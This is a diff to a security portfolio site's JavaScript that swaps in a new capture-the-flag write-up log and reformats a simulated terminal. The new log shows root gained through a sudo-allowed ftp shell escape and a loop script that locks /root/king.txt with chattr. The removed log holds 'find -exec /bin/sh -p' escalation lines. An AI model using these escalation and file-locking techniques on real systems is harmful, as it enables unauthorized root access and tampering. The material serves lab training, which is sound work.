@@ -2005,12 +2005,6 @@
           tags: ["JavaScript", "ML", "Phishing detection"],
           href: "https://threathex-0x7f3a9c1e.github.io/",
         },
-        {
-          title: "ADAudit",
-          desc: "Active Directory auditing tool in the spirit of BloodHound. Maps relationships between users, groups and computers to surface misconfigurations and possible attack paths.",
-          tags: ["Python", "Active Directory", "Auditing"],
-          href: "https://github.com/0x7f3a/AD-Audit",
-        },
       ];
 
       const WRITEUPS = [
@@ -2306,125 +2300,70 @@
           title: "Panda",
           desc: "Containerized root shell with layered flags needing both hex and base64 decoding, including one buried in a Samba binary's strings.",
           tags: ["Linux", "Encoding"],
-          log: String.raw`bash-4.2# id
-                  uid=1001(shifu) gid=1001(shifu) euid=0(root) groups=1001(shifu)
-                  bash-4.2# whoami
-                  root
-                  bash-4.2# cat king.txt
-                  0x7f3a
-                  bash-4.2# cat /root/.flag
-                  [REDACTED]
-                  bash-4.2# cat /home/po/flag.txt
-                  [REDACTED]
-                  bash-4.2# /home/shifu/flag.txt
-                  bash: /home/shifu/flag.txt: Permission denied
-                  bash-4.2# cat /home/shifu/flag.txt
-                  [REDACTED]
-                  bash-4.2# cat /home/tigress/flag.txt
-                  [REDACTED]
-                  bash-4.2# /var/www/html/flag/index.html (hex and b64)
-                  bash: syntax error near unexpected token \`hex'
-                  bash-4.2# cat /var/www/html/flag/index.html
-                  [REDACTED]
-                  bash-4.2# cat /var/www/html/06d63d6798d9b6c2f987f045b12031d6/flag
-                  [REDACTED]
-                  bash-4.2# cat /srv/samba/anonymous/binary
-                  [garbled binary data]
-                  bash-4.2# strings /srv/samba/anonymous/binary
-                  /lib64/ld-linux-x86-64.so.2
-                  libc.so.6
-                  printf
-                  __libc_start_main
-                  __gmon_start__
-                  GLIBC_2.2.5
-                  UH-0
-                  UH-0
-                  =(
-                  []A\A]A^A_
-                  Hello
-                  ;*3$"
-                  GCC: (GNU) 4.8.5 20150623 (Red Hat 4.8.5-39)
-                  crtstuff.c
-                  __JCR_LIST__
-                  deregister_tm_clones
-                  __do_global_dtors_aux
-                  completed.6355
-                  __do_global_dtors_aux_fini_array_entry
-                  frame_dummy
-                  __frame_dummy_init_array_entry
-                  binary.c
-                  __FRAME_END__
-                  __JCR_END__
-                  __init_array_end
-                  _DYNAMIC
-                  __init_array_start
-                  __GNU_EH_FRAME_HDR
-                  _GLOBAL_OFFSET_TABLE_
-                  __libc_csu_fini
-                  _edata
-                  printf@@GLIBC_2.2.5
-                  __libc_start_main@@GLIBC_2.2.5
-                  __data_start
-                  __gmon_start__
-                  __dso_handle
-                  _IO_stdin_used
-                  __libc_csu_init
-                  __bss_start
-                  main
-                  __TMC_END__
-                  .symtab
-                  .strtab
-                  .shstrtab
-                  .interp
-                  .note.ABI-tag
-                  .note.gnu.build-id
-                  .gnu.hash
-                  .dynsym
-                  .dynstr
-                  .gnu.version
-                  .gnu.version_r
-                  .rela.dyn
-                  .rela.plt
-                  .init
-                  .plt.got
-                  .text
-                  .fini
-                  .rodata
-                  .eh_frame_hdr
-                  .eh_frame
-                  .init_array
-                  .fini_array
-                  .jcr
-                  .dynamic
-                  .got.plt
-                  .data
-                  .bss
-                  .comment
-                  [REDACTED]
-                  6c6CXfJrjej5ATBD
-                  bash-4.2# cat /var/www/html/flag/index.html | xxd -p | base64
-                  [REDACTED]
-                  bash-4.2# cat /var/www/html/flag/index.html | xxd -p | base64 -d
-                  [garbled binary data]
-                  bash-4.2# cat /var/www/html/flag/index.html | xxd -p
-                  [REDACTED]
-                  bash-4.2# # Hex
-                  bash-4.2# xxd -p /var/www/html/flag/index.html
-                  [REDACTED]
-                  bash-4.2#
-                  bash-4.2# # Base64
-                  bash-4.2# base64 /var/www/html/flag/index.html
-                  [REDACTED]
-                  bash-4.2# cat /var/www/html/flag/index.html
-                  [REDACTED]
-                  bash-4.2#
-                  last flag: [REDACTED]
-                  To get to shifu's shell
-                  creds
-                  shifu:[Find it yourself]
-                  how to be root
-                  find . -exec /bin/sh -p \; -quit
-                  bash -i -p`,
+          log: String.raw`                                                                                                                                       
+┌──(root㉿kali)-[/home/kali]
+└─# ssh shifu@10.10.108.174  
+The authenticity of host '10.10.108.174 (10.10.108.174)' can't be established.
+ED25519 key fingerprint is: SHA256:8YIbia3DtzTm9rElf3yLUwoa07R7AEQ7WWARx3D6HYY
+This host key is known by the following other names/addresses:
+    ~/.ssh/known_hosts:6: [hashed name]
+    ~/.ssh/known_hosts:24: [hashed name]
+    ~/.ssh/known_hosts:28: [hashed name]
+    ~/.ssh/known_hosts:29: [hashed name]
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.108.174' (ED25519) to the list of known hosts.
+** WARNING: connection is not using a post-quantum key exchange algorithm.
+** This session may be vulnerable to "store now, decrypt later" attacks.
+** The server may need to be upgraded. See https://openssh.com/pq.html
+shifu@10.10.108.174's password: 
+Last login: Sat Apr 11 22:59:36 2020
+[shifu@panda ~]$ id
+uid=1001(shifu) gid=1001(shifu) groups=1001(shifu)
+[shifu@panda ~]$ sudo -l
+Matching Defaults entries for shifu on panda:
+    !visiblepw, always_set_home, match_group_by_gid, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
+    env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT
+    LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS
+    _XKB_CHARSET XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin
+
+User shifu may run the following commands on panda:
+    (root) NOPASSWD: /usr/bin/ftp
+[shifu@panda ~]$ sudo /usr/bin/ftp
+ftp> !/bin/sh
+sh-4.2# whoami
+root
+sh-4.2# id
+uid=0(root) gid=0(root) groups=0(root)
+sh-4.2# cat > /tmp/defend.sh << 'EOF'
+> #!/bin/bash
+> 
+> # ==== EDIT THESE FOR EACH MACHINE ====
+> USERNAME="0x7f3a"
+> KING_FILE="/root/king.txt"
+> # ======================================
+> 
+> while true; do
+>     current=$(cat "$KING_FILE" 2>/dev/null)
+>     attrs=$(lsattr "$KING_FILE" 2>/dev/null | awk '{print $1}')
+> 
+>     if [ "$current" != "$USERNAME" ]; then
+>         if [ -w "$KING_FILE" ]; then
+>             chattr -ia "$KING_FILE" 2>/dev/null
+>             echo "$USERNAME" > "$KING_FILE" 2>/dev/null
+>             chattr +ia "$KING_FILE" 2>/dev/null
+>             echo "[$(date +%T)] reclaimed $KING_FILE (was: $current, attrs: $attrs)"
+>         else
+>             echo "[$(date +%T)] locked out — not writable (attrs: $attrs)"
+>         fi
+>     fi
+>     sleep 0.1
+> done
+> EOF
+sh-4.2# chmod +x /tmp/defend.sh
+sh-4.2# /tmp/defend.sh
+[time] reclaimed /root/king.txt (was: , attrs: ----------------)
+
+`,
         },
         {
           title: "Production",
@@ -4843,7 +4782,8 @@ powershell -ExecutionPolicy Bypass -File C:\defend.ps1`,
           const p = resolve(arg);
           const d = parentOf(p);
           const n = p.slice(p.lastIndexOf("/") + 1);
-          if (denied(p)) return print("strings: " + arg + ": Permission denied");
+          if (denied(p))
+            return print("strings: " + arg + ": Permission denied");
           if (FS[p])
             return print("strings: Warning: '" + arg + "' is a directory");
           if (FS[d] && FS[d][n] !== undefined) {
@@ -4867,9 +4807,12 @@ powershell -ExecutionPolicy Bypass -File C:\defend.ps1`,
             );
           const b = binOf(arg);
           if (!b)
-            return print("Can't execute `" + arg + "': No such file or directory");
+            return print(
+              "Can't execute `" + arg + "': No such file or directory",
+            );
           const row = (call, ret) => call.padEnd(46) + " = " + ret;
-          const q = (s) => '"' + s.slice(0, 32) + '"' + (s.length > 32 ? "..." : "");
+          const q = (s) =>
+            '"' + s.slice(0, 32) + '"' + (s.length > 32 ? "..." : "");
           const lines = [];
           if (b.name === "crackme") {
             const key = args[1];
@@ -4886,7 +4829,9 @@ powershell -ExecutionPolicy Bypass -File C:\defend.ps1`,
                 row("strlen(" + q(key) + ")", key.length),
                 row("strcmp(" + q(key) + ", " + q(CRACK_KEY) + ")", r),
                 row(
-                  r === 0 ? 'puts("Access granted.")' : 'puts("Access denied.")',
+                  r === 0
+                    ? 'puts("Access granted.")'
+                    : 'puts("Access denied.")',
                   r === 0 ? 16 : 15,
                 ),
                 "+++ exited (status " + (r === 0 ? 0 : 1) + ") +++",
@@ -4897,7 +4842,10 @@ powershell -ExecutionPolicy Bypass -File C:\defend.ps1`,
             lines.push(
               row("setvbuf(0x7f4a5b9f6780, 0, 2, 0)", 0),
               row('puts("Enter your name: ")', 18),
-              row("gets(0x7ffd9c3a1e30, 0x7f4a5b9f8a80, 0x7f4a5b8b9a37)", "0x7ffd9c3a1e30"),
+              row(
+                "gets(0x7ffd9c3a1e30, 0x7f4a5b9f8a80, 0x7f4a5b8b9a37)",
+                "0x7ffd9c3a1e30",
+              ),
               row('printf("Hello, %s!\\n", "AAAA")', hello.length),
               "+++ exited (status 0) +++",
             );
@@ -4910,7 +4858,11 @@ powershell -ExecutionPolicy Bypass -File C:\defend.ps1`,
           if (cwd !== HOME)
             return print("bash: ./vuln: No such file or directory");
           const name = a.join(" ") || "anon";
-          const lines = ["Enter your name: " + name.slice(0, 24) + (name.length > 24 ? "..." : "")];
+          const lines = [
+            "Enter your name: " +
+              name.slice(0, 24) +
+              (name.length > 24 ? "..." : ""),
+          ];
           if (name.length >= 72) {
             lines.push("Segmentation fault (core dumped)");
           } else {
